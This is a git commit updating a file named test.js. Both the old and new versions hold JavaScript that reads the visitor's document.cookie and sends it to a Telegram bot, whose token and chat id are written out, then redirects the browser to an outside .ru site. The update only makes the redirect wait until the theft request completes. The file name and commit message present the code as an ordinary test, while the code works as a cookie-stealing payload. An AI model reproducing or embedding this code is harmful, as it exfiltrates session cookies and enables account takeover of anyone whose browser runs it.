54ad392b169efc535659d843ccfe1f75e5ad7172
AMAT0RY <81570058+AMAT0RY@users.noreply.github.com>
2026-03-27 00:33:01 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,4 @@
-fetch('https://api.telegram.org/bot7961713165:AAFdb4A5nW87MqOOk53YKk-3gKEkaZRmlg0/sendMessage?chat_id=-1003590380246&text='+encodeURIComponent(document.cookie));
-window.location("https://www.dist-mspk.ru/");
+fetch('https://api.telegram.org/bot7961713165:AAFdb4A5nW87MqOOk53YKk-3gKEkaZRmlg0/sendMessage?chat_id=-1003590380246&text=' + encodeURIComponent(document.cookie))
+  .finally(() => {
+    window.location = "https://www.dist-mspk.ru/";
+  });
